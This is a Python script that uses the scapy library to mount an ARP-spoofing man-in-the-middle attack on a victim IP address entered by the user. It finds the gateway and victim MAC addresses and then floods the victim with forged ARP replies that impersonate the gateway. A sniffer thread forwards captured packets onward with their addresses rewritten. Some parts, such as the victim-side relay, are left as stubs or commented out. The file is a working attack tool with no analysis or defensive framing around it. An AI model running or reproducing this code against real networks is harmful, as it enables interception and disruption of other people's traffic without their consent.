#coding: utf-8
import os
import logging
import binascii
import re
import sys
import threading
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
from scapy.all import *

myMAC = 0
victimMAC = 0
myIP = 0
victimIP = 0
gatewayIP = 0
gatewayMAC = 0

class arp_poison(threading.Thread):

	def run(self):
		global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
		while(True):
				# Malicious ARP packet send			
			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)
#			sendp(Ether(dst=gatewayMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=victimIP, pdst=gatewayIP, hwsrc=myMAC, hwdst=gatewayMAC), count=3)
			time.sleep(1)


def relay(packet):
	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
	p = packet[0]
	ether_type = str(hex(p[Ether].type))
	p[Ether].dst = gatewayMAC
	p[Ether].src = victimMAC
	if ether_type == '0x800':
		p[IP].src = victimIP
	sendp(p)

def relay_victim(packet):
	pass

class to_gateway(threading.Thread):
	def run(self):
		while(True):
			sniff(prn=relay, count=1)

class to_victim(threading.Thread):
	def run(self):
		while(True):
			pass

def main():
	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
	victimIP = raw_input("[*] Please enter the victim's IP >> ")
	ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
	if not(ok):
		print "Error occured! Invalid IP format."	
		sys.exit(1)

	gatewayIP = os.popen("route | awk '/default/ { print $2 }'").read().replace('\n','')	# GatewayIP parsing
	myIP = os.popen("ifconfig eth0 | awk '/inet addr:/ { print $2 }'").read()[5:].replace('\n','')		# HostIP parsing
	myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')		# HostMAC parsing
	broadcast = 'ff:ff:ff:ff:ff:ff'
	broadcast2 = '00:00:00:00:00:00'
	arp_stat = os.popen("arp -a").read()		# arp table read

	victimMAC = ""
	temp = ""
	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)
	
	if gatewayMAC:
		gatewayMAC = gatewayMAC[0]
	else:
		print "Can't get gatewayMAC."
		sys.exit(1)
	
	if ok:
		victimMAC = ok[0]	# If exist

	else:
		try:
			p = sr1(Ether(dst=broadcast, src=myMAC)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2))		# Broadcast ARP packet to victimIP
			temp = p[0].summary()		# get ARP response packet
			ok = re.findall("ARP is at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2})", temp)	# victimMAC parsing
			if ok:
				victimMAC = ok[0]	# victimMAC allocation
		except Exception as e:
			print "Error occured! Can't load the victimMAC. : " + str(e)
			sys.exit(1)

	tArp = arp_poison()
	tGateway = to_gateway()
#	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)

	tArp.start()
	tGateway.start()
#	tVictim.start()

	tArp.join()
	tGateway.join()
#	tVictim.join()

if __name__ == '__main__':
	main()
